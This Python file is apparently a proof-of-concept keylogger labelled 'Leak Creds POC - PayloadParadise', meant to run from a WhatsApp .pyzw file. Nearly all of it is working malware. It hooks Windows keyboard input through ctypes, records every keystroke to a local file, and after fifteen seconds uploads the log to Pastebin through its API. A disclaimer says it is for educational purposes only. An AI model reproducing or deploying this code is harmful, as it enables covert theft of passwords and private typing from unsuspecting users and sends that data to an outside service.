import os
import time
import threading
import ctypes
import ctypes.wintypes
import requests

# ============================================================
# Leak Creds POC - PayloadParadise
# Uses ctypes Win32 API hooks instead of pynput to work
# in the WhatsApp .pyzw execution context.
# FOR EDUCATIONAL PURPOSES ONLY.
# ============================================================

# Define the log file path
LOG_FILE = os.path.join("secrets", "keylog.txt")

# Win32 API constants
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_SYSKEYDOWN = 0x0104
HC_ACTION = 0

# Win32 API types
LRESULT = ctypes.c_long
ULONG_PTR = ctypes.POINTER(ctypes.c_ulong)

user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

# Special key mapping
SPECIAL_KEYS = {
    0x08: "[backspace]", 0x09: "[tab]", 0x0D: "[enter]",
    0x10: "[shift]", 0x11: "[ctrl]", 0x12: "[alt]",
    0x14: "[capslock]", 0x1B: "[esc]", 0x20: " ",
    0x25: "[left]", 0x26: "[up]", 0x27: "[right]", 0x28: "[down]",
    0x2E: "[delete]", 0x5B: "[win]", 0x5C: "[win]",
}

class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", ctypes.wintypes.DWORD),
        ("scanCode", ctypes.wintypes.DWORD),
        ("flags", ctypes.wintypes.DWORD),
        ("time", ctypes.wintypes.DWORD),
        ("dwExtraInfo", ULONG_PTR),
    ]

HOOKPROC = ctypes.WINFUNCTYPE(LRESULT, ctypes.c_int, ctypes.wintypes.WPARAM, ctypes.wintypes.LPARAM)

def vk_to_char(vk_code):
    if vk_code in SPECIAL_KEYS:
        return SPECIAL_KEYS[vk_code]
    scan_code = user32.MapVirtualKeyW(vk_code, 0)
    kbd_state = (ctypes.c_ubyte * 256)()
    user32.GetKeyboardState(kbd_state)
    buf = (ctypes.c_wchar * 4)()
    result = user32.ToUnicode(vk_code, scan_code, kbd_state, buf, len(buf), 0)
    if result > 0:
        return buf[0]
    return f"[vk:{vk_code}]"

def low_level_keyboard_proc(nCode, wParam, lParam):
    if nCode == HC_ACTION and wParam in (WM_KEYDOWN, WM_SYSKEYDOWN):
        kb = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
        char = vk_to_char(kb.vkCode)
        try:
            with open(LOG_FILE, 'a') as f:
                f.write(char)
        except Exception:
            pass
    return user32.CallNextHookEx(None, nCode, wParam, lParam)

_hook_callback = HOOKPROC(low_level_keyboard_proc)

def start_keylogger():
    hook = user32.SetWindowsHookExW(WH_KEYBOARD_LL, _hook_callback, kernel32.GetModuleHandleW(None), 0)
    if not hook:
        return
    msg = ctypes.wintypes.MSG()
    while user32.GetMessageW(ctypes.byref(msg), None, 0, 0) != 0:
        user32.TranslateMessage(ctypes.byref(msg))
        user32.DispatchMessageW(ctypes.byref(msg))
    user32.UnhookWindowsHookEx(hook)

def send_to_pastebin():
    """Send logged data to Pastebin."""
    try:
        with open(os.path.join("secrets", "dev_key"), 'r') as f:
            key = f.read().strip()
    except FileNotFoundError:
        print("Dev key not found")
        return

    try:
        with open(os.path.join("secrets", "user_key"), 'r') as f:
            user_key = f.read().strip()
    except FileNotFoundError:
        print("User key not found")
        return

    try:
        with open(LOG_FILE, 'r') as file:
            file_contents = file.read()

        login_data = {
            'api_dev_key': key,
            'api_user_name': 'user_name', # username
            'api_user_password': 'secure_password', # make sure this is secure
            'api_option': 'paste',
            'api_paste_code': file_contents,
            'api_paste_name': "keylog_data",
            'api_paste_expire_date': '10M',
            'api_user_key': user_key,
            'api_paste_format': 'gettext'
        }

        r = requests.post("https://pastebin.com/api/api_post.php", data=login_data)
        print("Paste status:", r.status_code if r.status_code != 200 else "OK/200")
        print("Paste URL:", r.text)

    except Exception as e:
        print(f"Error sending data to Pastebin: {e}")

def time_limit_check(duration):
    """Check if the time limit is reached and exit the program."""
    start = time.time()
    while True:
        if time.time() > start + duration:
            print("Time elapsed, sending data to Pastebin...")
            send_to_pastebin()
            os._exit(0)
        time.sleep(1)

if __name__ == "__main__":
    duration = 15  # seconds
    
    # Create secrets folder if it doesn't exist
    os.makedirs("secrets", exist_ok=True)
    
    # Create log file if it doesn't exist
    with open(LOG_FILE, 'w') as f:
        pass
        
    timer_thread = threading.Thread(target=time_limit_check, args=(duration,), daemon=True)
    timer_thread.start()

    start_keylogger()
